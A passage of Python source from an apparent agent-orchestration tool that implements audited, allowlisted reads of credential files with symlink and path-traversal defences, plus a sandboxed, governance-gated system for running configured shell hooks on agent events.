      a DIFFERENT path raises (a companion cannot silently repoint a core entry
      such as ``kiro_usage_api.sso_token_cli`` at an attacker file).  Re-
      registering the same key with the same path is idempotent.
    * ``rel_path`` must be a relative path with no ``..`` component and no
      absolute/anchor part, so the resolved target can only ever live under
      ``~`` (the read still resolves under ``Path.home()`` at call time).
    * the resolved ``~/<rel_path>`` must already be classified sensitive by
      :func:`kiro_crew.security.is_sensitive_path` — the carve-out is only valid
      for a path the shared file gate otherwise blocks; registering a
      non-sensitive path is a configuration error and raises.
    """
    if not isinstance(read_id, str) or not read_id:
        raise ValueError("register_internal_read_path: read_id must be a non-empty string")
    existing = _INTERNAL_READ_ALLOWLIST.get(read_id)
    if existing is not None and existing != rel_path:
        raise ValueError(
            f"register_internal_read_path: {read_id!r} already registered to a "
            f"different path {existing!r}; refusing to repoint",
        )
    p = Path(rel_path)
    if p.is_absolute() or p.anchor or ".." in p.parts:
        raise ValueError(
            f"register_internal_read_path: rel_path must be relative with no '..' "
            f"(got {rel_path!r})",
        )
    resolved = str((Path.home() / p).expanduser())
    if not is_sensitive_path(resolved):
        raise ValueError(
            f"register_internal_read_path: {rel_path!r} resolves to a non-sensitive "
            f"path; the carve-out is only valid for a sensitive path",
        )
    _INTERNAL_READ_ALLOWLIST[read_id] = rel_path


def safe_read_file_internal(read_id: str) -> bytes | None:
    """Read a sensitive path on behalf of an authorized internal caller.

    The ``read_id`` must be a key in ``_INTERNAL_READ_ALLOWLIST``. The
    function resolves the allowlisted path under ``~``, verifies it is in fact
    sensitive (defense in depth), reads the bytes (subject to
    ``MAX_FILE_BYTES``), emits an SEL audit event on every outcome, and returns
    the bytes -- or ``None`` if missing / unreadable / oversized.

    Raises ``PermissionError`` if ``read_id`` is not allowlisted -- callers must
    never construct ``read_id`` from untrusted input.

    Fail-closed audit: if the SEL audit for the ``success`` outcome cannot be
    recorded (backend unavailable, or the emit raised), the function returns
    ``None`` instead of the bytes -- a ``logger.warning`` is not itself an SEL
    audit event, and the carve-out's validity depends on every successful read
    producing a real audit. Callers already handle ``None`` (degrade to the
    text scrape).
    """
    if read_id not in _INTERNAL_READ_ALLOWLIST:
        _emit_internal_read_audit(read_id, "not_allowlisted")
        raise PermissionError(
            f"safe_read_file_internal denied: {read_id!r} not in allowlist",
        )

    rel_path = _INTERNAL_READ_ALLOWLIST[read_id]
    abs_path = Path.home() / rel_path
    resolved = str(abs_path.expanduser())

    # Defense in depth: the allowlist is only a meaningful carve-out if the
    # underlying path is in fact sensitive. If it has stopped being sensitive,
    # the carve-out has nothing to protect against and the configuration has
    # drifted; refuse rather than silently widen access.
    if not is_sensitive_path(resolved):
        _emit_internal_read_audit(read_id, "not_sensitive")
        raise PermissionError(
            f"safe_read_file_internal denied: {read_id!r} resolves to a "
            f"non-sensitive path; allowlist is only valid for sensitive paths",
        )

    # Open with O_NOFOLLOW so a symlink at the final path component (e.g. a
    # planted ~/.aws/sso/cache/kiro-auth-token-cli.json -> attacker file) is
    # refused, binding the read to the real allowlisted file rather than a
    # redirected target. Check + read share ONE descriptor (TOCTOU-safe), and
    # fstat confirms a regular file before reading.
    import os
    import stat

    try:
        fd = os.open(resolved, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except FileNotFoundError:
        _emit_internal_read_audit(read_id, "missing")
        return None
    except OSError:
        # ELOOP (final component is a symlink) and any other open error —
        # fail closed, never following the link.
        _emit_internal_read_audit(read_id, "unreadable")
        return None

    data = b""
    try:
        st = os.fstat(fd)
        if not stat.S_ISREG(st.st_mode):
            _emit_internal_read_audit(read_id, "not_regular")
            return None
        with os.fdopen(fd, "rb", closefd=True) as fh:
            fd = -1  # ownership transferred to fh; do not double-close
            data = fh.read(MAX_FILE_BYTES + 1)
    except OSError:
        _emit_internal_read_audit(read_id, "unreadable")
        return None
    finally:
        if fd != -1:
            try:
                os.close(fd)
            except OSError:
                pass

    if len(data) > MAX_FILE_BYTES:
        _emit_internal_read_audit(read_id, "too_large")
        return None

    if not _emit_internal_read_audit(read_id, "success"):
        logger.error(
            "Denying sensitive read %s: SEL audit unavailable; the carve-out "
            "requires an audit trail and the caller will see None instead of "
            "the file bytes.",
            read_id,
        )
        return None
    return data


def _emit_internal_read_audit(read_id: str, outcome: str) -> bool:
    """Emit an SEL audit event for an internal sensitive/credential read.

    Returns ``True`` iff an SEL event was recorded, ``False`` otherwise (SEL
    backend unavailable or the emit raised). ``safe_read_file_internal`` /
    ``emit_internal_read_audit`` gate the return of sensitive bytes on this
    result for ``success`` outcomes: a ``logger.warning`` is NOT itself an SEL
    audit event, so a read whose audit could not be recorded must be denied.
    """
    try:
        from kiro_crew.sel import sel
    except ImportError:  # pragma: no cover - sel optional in some test envs
        logger.warning(
            "SEL backend unavailable; internal-read audit dropped "
            "for read_id=%s outcome=%s",
            read_id,
            outcome,
        )
        return False
    try:
        sel().log_tool_invocation(
            session_key="hooks:safe_read_file_internal",
            tool_name=f"internal_read.{read_id}",
            outcome=outcome,
            source="hooks",
            # audit-or-deny: a "success" gates the return of live credential
            # bytes, so it must be written SYNCHRONOUSLY (critical=True drains the
            # queue and re-raises on a filesystem failure). In async SEL mode a
            # non-critical log() only ENQUEUES — a later writer-thread failure is
            # swallowed and this would wrongly return True for an audit that
            # never landed. Non-success outcomes already return None / raise, so
            # a dropped event there still leaves an observable log line.
            critical=(outcome == "success"),
        )
    except Exception:  # noqa: BLE001 - audit must never break the caller
        logger.warning(
            "SEL audit emission failed for internal read read_id=%s",
            read_id,
            exc_info=True,
        )
        return False
    return True


# Registry of sanctioned audit-only credential reads: read_id -> the
# credential-bearing location it covers. These are reads of paths that are NOT
# classified sensitive (so they cannot route through ``safe_read_file_internal``
# / ``_INTERNAL_READ_ALLOWLIST``) yet still hold a live secret and therefore owe
# the same SEL audit trail. Every entry requires the same security-review
# justification discipline as ``_INTERNAL_READ_ALLOWLIST``.
_AUDIT_ONLY_READ_IDS: dict[str, str] = {
    # kiro-cli / amazon-q SQLite auth stores: live SSO bearer token on Linux.
    # Read read-only by ``kiro_crew.dashboard.handlers.kiro_usage_api`` for the
    # single hardcoded GetUsageLimits call (see the kiro_usage_api.sso_token_*
    # justification in _INTERNAL_READ_ALLOWLIST -- identical posture, different
    # storage layout).
    "kiro_usage_api.sqlite_token": ".local/share/{kiro-cli,amazon-q}/data.sqlite3",
}


def emit_internal_read_audit(read_id: str, outcome: str) -> bool:
    """Emit an SEL audit event for a credential read that cannot route through
    :func:`safe_read_file_internal`.

    ``safe_read_file_internal`` covers reads of *sensitive paths*. Some
    credential material lives at a path that is NOT classified sensitive yet
    still holds a live secret -- e.g. the kiro-cli auth store at
    ``~/.local/share/kiro-cli/data.sqlite3``. Such a reader still owes the same
    audit trail, so it calls this wrapper with its own ``read_id`` and outcome.

    The ``read_id`` MUST be registered in ``_AUDIT_ONLY_READ_IDS`` -- this entry
    point enforces its own allowlist, mirroring the ``_INTERNAL_READ_ALLOWLIST``
    gate, so it cannot be used as an unscoped bypass of the SEL-audit surface.
    An unregistered ``read_id`` returns ``False`` without emitting, which
    callers treat as "audit unavailable" and fail closed on.
    """
    if read_id not in _AUDIT_ONLY_READ_IDS:
        logger.warning("emit_internal_read_audit: unregistered read_id %r rejected", read_id)
        return False
    return _emit_internal_read_audit(read_id, outcome)


# ── Script Hooks ──


@dataclass
class ScriptHook:
    """Executable hook that runs a shell command on a trigger event.

    Aligned with Kiro CLI hook semantics:
    - Exit 0: success (stdout → context for AgentSpawn/UserPromptSubmit)
    - Exit 2: block tool (PreToolUse only, stderr → LLM)
    - Other: warning (stderr shown to user)
    """

    id: str = ""
    name: str = ""
    event: str = HOOK_EVENT_USER_PROMPT_SUBMIT
    matcher: str = ""  # tool matcher for PreToolUse/PostToolUse (empty = all tools)
    command: str = ""  # shell command to execute
    timeout: int = 30  # seconds (Kiro CLI default is 30s)
    enabled: bool = True
    last_run: float = 0.0
    last_status: str = ""  # "ok", "error", "timeout", "blocked"
    run_count: int = 0

    def to_dict(self) -> dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: dict) -> ScriptHook:
        # Support legacy "pattern" field as fallback for "matcher"
        matcher = data.get("matcher", data.get("pattern", ""))
        return cls(
            id=data.get("id", str(uuid.uuid4())[:8]),
            name=data.get("name", ""),
            event=data.get("event", HOOK_EVENT_USER_PROMPT_SUBMIT),
            matcher=matcher,
            command=data.get("command", ""),
            timeout=data.get("timeout", 30),
            enabled=data.get("enabled", True),
            last_run=data.get("last_run", 0.0),
            last_status=data.get("last_status", ""),
            run_count=data.get("run_count", 0),
        )


@dataclass
class ScriptHookResult:
    """Result of executing a script hook."""

    hook_id: str
    hook_name: str
    event: str
    stdout: str = ""
    stderr: str = ""
    exit_code: int = -1
    error: str = ""
    duration_ms: int = 0

    @property
    def blocked(self) -> bool:
        """PreToolUse exit code 2 = block tool."""
        return self.exit_code == 2

    @property
    def succeeded(self) -> bool:
        return self.exit_code == 0


def _script_hooks_capability_denied(session_key: str = "") -> str | None:
    """Return a denial reason if governance disables ``capabilities.script_hooks``.

    Script hooks run an operator/agent-authored shell command in a subprocess
    (``run_script_hook`` → ``/bin/sh -c``), an arbitrary code-execution surface.
    The ``capabilities.script_hooks`` gate (default OFF in the catalog) lets a
    policy/profile forbid firing them.  Best-effort beyond the always-on
    sandbox/redaction guards: a ``PlatformCompositionError`` propagates
    (fail-closed CPP); any other error degrades to "no opinion" (None) so a
    transient governance glitch cannot wedge every hook.
    """
    from kiro_crew.platform.context import PlatformCompositionError

    try:
        from kiro_crew.platform.governance_profiles import governance_permits

        # item="" → the CapabilityGate's ``enabled`` flag is what is queried.
        decision = governance_permits("capabilities.script_hooks", "", session_key=session_key)
        if not getattr(decision, "permitted", True):
            return getattr(decision, "reason", "script_hooks capability disabled")
        return None
    except PlatformCompositionError:
        raise
    except Exception:
        # Wrapped (see _governance_denial): a late-import failure must not turn the
        # soft fail-open into a hard fail that wedges every script hook.
        try:
            from kiro_crew.platform.governance_profiles import audit_governance_degraded

            audit_governance_degraded(
                "run_script_hook", session_key=session_key, scope="capabilities.script_hooks"
            )
        except Exception:
            logger.debug("governance degrade audit unavailable", exc_info=True)
        return None


async def run_script_hook(
    hook: ScriptHook, context: str = "", hook_event: dict | None = None
) -> ScriptHookResult:
    """Execute a script hook's command with timeout.

    Passes hook event as JSON via STDIN (Kiro CLI compatible).
    """
    import os

    start = time.monotonic()
    # Governance: the ``capabilities.script_hooks`` gate (default OFF) may forbid
    # running script hooks for the active surface. Checked before the subprocess
    # spawns. The session key is carried on the hook_event when a caller threads
    # it (parent_session_key); absent → policy-only resolution.
    sk = ""
    if hook_event:
        sk = str(hook_event.get("parent_session_key") or hook_event.get("session_key") or "")
    gov_denied = _script_hooks_capability_denied(sk)
    if gov_denied:
        hook.last_run = time.time()
        hook.last_status = "blocked"
        hook.run_count += 1
        try:
            from kiro_crew.sel import sel

            sel().log_governance_decision(
                session_key=sk,
                tool_name=f"run_script_hook:{hook.name or hook.id}",
                scope="capabilities.script_hooks",
                outcome="denied",
                reason=gov_denied,
            )
        except Exception:
            logger.debug("script_hook deny audit failed", exc_info=True)
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=f"Blocked by governance policy: {gov_denied}",
            exit_code=2,  # PreToolUse "block tool" convention
            duration_ms=int((time.monotonic() - start) * 1000),
        )
    # Build hook event JSON for STDIN
    if hook_event is None:
        hook_event = {"hook_event_name": hook.event, "cwd": os.getcwd()}
    stdin_data = json.dumps(hook_event).encode()

    try:
        # circular import: sandbox → registry → apps → hooks, so import at call time
        from kiro_crew.sandbox import cgroup_scope_argv, resource_limit_preexec, wrap_argv

        # The env var is bounded by ARG_MAX — a multi-KB Stop segment there can
        # fail subprocess creation (~32K on Windows). Cap the ENV copy only; the
        # full context still reaches the hook via the stdin JSON payload
        # (Stop -> hook_event["assistant_text"]) and drove matcher evaluation.
        env_context = context[:500] if hook.event == HOOK_EVENT_STOP else context
        env = {
            **os.environ,
            "KIROCREW_HOOK_EVENT": hook.event,
            "KIROCREW_HOOK_CONTEXT": env_context,
        }
        # Shell per platform: POSIX /bin/sh -c, Windows cmd /c (no /bin/sh there).
        if platform_compat.IS_WINDOWS:
            argv = ["cmd", "/c", hook.command]
        else:
            argv = ["/bin/sh", "-c", hook.command]
        wrapped_argv, cleanup_path = wrap_argv(argv)
        wrapped_argv = cgroup_scope_argv(wrapped_argv)  # cgroup DoS ceiling
        # Process-group isolation for clean tree-kill on timeout. Pass both flags
        # explicitly (NOT **dict unpack — breaks mypy's Popen overload resolution
        # on the build fleet): start_new_session=True is a no-op on Windows,
        # creationflags resolves to 0 (no-op) on POSIX. The Windows flag makes the
        # tree taskkill /T-reapable; POSIX setsid -> killpg.
        proc = await asyncio.create_subprocess_exec(
            *wrapped_argv,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=env,
            start_new_session=platform_compat.IS_POSIX,
            creationflags=platform_compat.CREATE_NEW_PROCESS_GROUP,
            preexec_fn=resource_limit_preexec(),
        )
        try:
            stdout_b, stderr_b = await asyncio.wait_for(
                proc.communicate(input=stdin_data), timeout=hook.timeout
            )
        finally:
            if cleanup_path:
                try:
                    os.unlink(cleanup_path)
                except OSError:
                    pass
        elapsed = int((time.monotonic() - start) * 1000)
        exit_code = proc.returncode or 0
        hook.last_run = time.time()
        hook.last_status = "blocked" if exit_code == 2 else ("ok" if exit_code == 0 else "error")
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            stdout=stdout_b.decode(errors="replace").strip(),
            stderr=stderr_b.decode(errors="replace").strip(),
            exit_code=exit_code,
            duration_ms=elapsed,
        )
    except asyncio.TimeoutError:
        # Kill the whole process tree (shell + grandchildren) to prevent orphans.
        # platform_compat: killpg on POSIX, taskkill /T on Windows (os.killpg /
        # signal.SIGKILL are POSIX-only and would AttributeError on win32).
        try:
            if proc.returncode is None:
                # Async variant offloads the Windows taskkill spawn — the hook
                # timeout path already runs on the event loop, so we never want
                # to stall it further while taskkill.exe walks the tree
                await platform_compat.kill_process_tree_async(
                    proc.pid, platform_compat.SIGKILL
                )
                await proc.communicate()
        except Exception:
            pass
        elapsed = int((time.monotonic() - start) * 1000)
        hook.last_run = time.time()
        hook.last_status = "timeout"
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=f"Timed out after {hook.timeout}s",
            duration_ms=elapsed,
        )
    except Exception as exc:
        elapsed = int((time.monotonic() - start) * 1000)
        hook.last_run = time.time()
        hook.last_status = "error"
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=str(exc),
            duration_ms=elapsed,
        )


# ── Script Hook Store (persistence) ──

_HOOKS_FILE = "hooks.json"


class ScriptHookStore:
    """Persist script hooks to ~/.kirocrew/hooks.json."""

    def __init__(self, config_dir: Path | None = None):
        from kiro_crew.config.loader import config_dir as _cfg_dir

        self._dir = config_dir or _cfg_dir()
        self._path = self._dir / _HOOKS_FILE
        self._hooks: dict[str, ScriptHook] = {}
        self._load()

    def _load(self) -> None:
        if not self._path.exists():
            return
        try:
            data = json.loads(self._path.read_text(encoding="utf-8"))
            for h in data.get("hooks", []):
                hook = ScriptHook.from_dict(h)
                self._hooks[hook.id] = hook
        except (json.JSONDecodeError, OSError) as exc:
            logger.warning("Failed to load hooks: %s", exc)

    def _save(self) -> None:
        self._dir.mkdir(parents=True, exist_ok=True)
        data = {"hooks": [h.to_dict() for h in self._hooks.values()]}
        self._path.write_text(json.dumps(data, indent=2), encoding="utf-8")

    def list_all(self) -> list[ScriptHook]:
        return list(self._hooks.values())

    def get(self, hook_id: str) -> ScriptHook | None:
        return self._hooks.get(hook_id)

    def create(self, data: dict) -> ScriptHook:
        hook = ScriptHook.from_dict(data)
        if not hook.id:
            hook.id = str(uuid.uuid4())[:8]
        self._hooks[hook.id] = hook
        self._save()
        return hook

    def update(self, hook_id: str, data: dict) -> ScriptHook | None:
        hook = self._hooks.get(hook_id)
        if not hook:
            return None
        if "event" in data and data["event"] not in HOOK_EVENTS:
            raise ValueError(f"invalid event: {data['event']}")
        if "timeout" in data:
            t = data["timeout"]
            if not isinstance(t, int) or not (1 <= t <= 300):
                raise ValueError("timeout must be an integer between 1 and 300")
        for k in ("name", "event", "matcher", "command", "timeout", "enabled"):
            if k in data:
                setattr(hook, k, data[k])
        self._save()
        return hook

    def delete(self, hook_id: str) -> bool:
        if hook_id in self._hooks:
            del self._hooks[hook_id]
            self._save()
            return True
        return False

    def toggle(self, hook_id: str) -> ScriptHook | None:
        hook = self._hooks.get(hook_id)
        if not hook:
            return None
        hook.enabled = not hook.enabled
        self._save()
        return hook

    async def fire(
        self,
        event: str,
        context: str = "",
        tool_name: str = "",
        tool_input: dict | None = None,
        tool_response: dict | None = None,
        subagent_id: str | None = None,
        parent_session_key: str | None = None,
        agent_role: str | None = None,
    ) -> list[ScriptHookResult]:
        """Fire all enabled hooks matching the given event. Returns results.

        For PreToolUse/PostToolUse, matcher filters by tool name.
        For AgentSpawn/UserPromptSubmit/Stop, all hooks for that event fire.

        Optional ``subagent_id``, ``parent_session_key``, and ``agent_role`` are
        emitted into the hook_event payload so hook scripts can attribute tool
        calls to the specific agent/session that fired them. Parent contexts
        (dashboard chat, generic LLM helpers) leave them as ``None``.

        For the Stop event, the full ``context`` (the final assistant segment) is
        used for matcher evaluation and echoed to stdin as ``assistant_text``;
        only the ``KIROCREW_HOOK_CONTEXT`` env var is length-capped downstream in
        ``run_script_hook`` (ARG_MAX safety), so a hook keying on the tail of the
        segment reads it from stdin JSON rather than the truncated env var.
        """
        import os

        results = []
        # Build base hook event (Kiro CLI format)
        hook_event: dict = {"hook_event_name": event, "cwd": os.getcwd()}
        if event == HOOK_EVENT_USER_PROMPT_SUBMIT and context:
            hook_event["prompt"] = context
        elif event == HOOK_EVENT_STOP:
            # Echo the final assistant segment to stdin so a hook keying on the
            # tail — e.g. the harness [OPTIONS:] line, past the env var's cap —
            # reads the whole thing here rather than the truncated env var.
            # Unconditional (even when "") so an empty/no-output Stop turn still
            # carries the key and a hook that always reads it never KeyErrors.
            hook_event["assistant_text"] = context
        if tool_name:
            hook_event["tool_name"] = tool_name
        if tool_input is not None:
            hook_event["tool_input"] = tool_input
        if tool_response is not None:
            hook_event["tool_response"] = tool_response
        if subagent_id:
            hook_event["subagent_id"] = subagent_id
        if parent_session_key:
            hook_event["parent_session_key"] = parent_session_key
        if agent_role:
            hook_event["agent_role"] = agent_role

        for hook in list(self._hooks.values()):
            if not hook.enabled or hook.event != event:
                continue
            # Matcher filtering: for tool hooks, match tool name; for others, match context
            if hook.matcher:
                if event in (HOOK_EVENT_PRE_TOOL_USE, HOOK_EVENT_POST_TOOL_USE):
                    if not _tool_matches(hook.matcher, tool_name):
                        continue
                elif context and not fnmatch.fnmatch(context.lower(), hook.matcher.lower()):
                    continue
            result = await run_script_hook(hook, context, hook_event)
            results.append(result)
            logger.info(
                "Hook %s (%s): %s in %dms (exit=%d)",
                hook.name,
                event,
                hook.last_status,
                result.duration_ms,
                result.exit_code,
            )
        hooks_snapshot = [h.to_dict() for h in self._hooks.values()]
        await asyncio.to_thread(self._save_snapshot, hooks_snapshot)
        return results

    def _save_snapshot(self, hooks_data: list[dict]) -> None:
        """Thread-safe save using pre-captured hook snapshot."""
        self._dir.mkdir(parents=True, exist_ok=True)
        data = {"hooks": hooks_data}
        self._path.write_text(json.dumps(data, indent=2), encoding="utf-8")


# -- Global script hook store accessor --
# Set by dashboard server.py / handlers.py when the store is initialized.
# Allows any module (task_executor, llm_helpers, subagent) to fire script hooks
# without needing a reference to DashboardState.

_global_script_hook_store: ScriptHookStore | None = None


def set_global_hook_store(store: ScriptHookStore) -> None:
    """Register the global script hook store."""
    global _global_script_hook_store
    _global_script_hook_store = store


def get_global_hook_store() -> ScriptHookStore | None:
    """Get the global script hook store, or None if not initialized."""
    return _global_script_hook_store


async def fire_tool_hooks(
    hook_store: ScriptHookStore | None,
    event_title: str,
    event_tool_input: str | None = None,
    subagent_id: str | None = None,
    parent_session_key: str | None = None,
    agent_role: str | None = None,
) -> None:
    """Fire PreToolUse hooks for an EVENT_TOOL_CALL event.

    PostToolUse is NOT fired here because EVENT_TOOL_CALL is a notification
    that the tool is starting - the tool hasn't completed yet. PostToolUse
    should be fired on EVENT_TOOL_RESULT when available.

    Note: For EVENT_TOOL_CALL, hooks are informational only. The tool is
    already running (auto-approved by kiro-cli), so hook results cannot
    block execution. Hook scripts can log, audit, or trigger side effects.

    Optional ``subagent_id``, ``parent_session_key``, and ``agent_role`` are
    forwarded to the underlying hook_store so hook scripts can attribute
    tool calls to the specific agent/session that fired them. Callers in
    parent contexts (dashboard chat, generic LLM helpers) leave them as
    ``None``; subagent and taskrunner callers pass real values.
    """
    if hook_store is None:
        return
    tool_name = event_title or ""
    if tool_name.startswith("Running: "):
        tool_name = tool_name[9:]
    tool_input = None
    if event_tool_input:
        try:
            tool_input = json.loads(event_tool_input)
        except Exception:
            pass
    try:
        await hook_store.fire(
            HOOK_EVENT_PRE_TOOL_USE,
            tool_name=tool_name,
            tool_input=tool_input,
            subagent_id=subagent_id,
            parent_session_key=parent_session_key,
            agent_role=agent_role,
        )
    except Exception:
        logger.debug("PreToolUse hook error", exc_info=True)
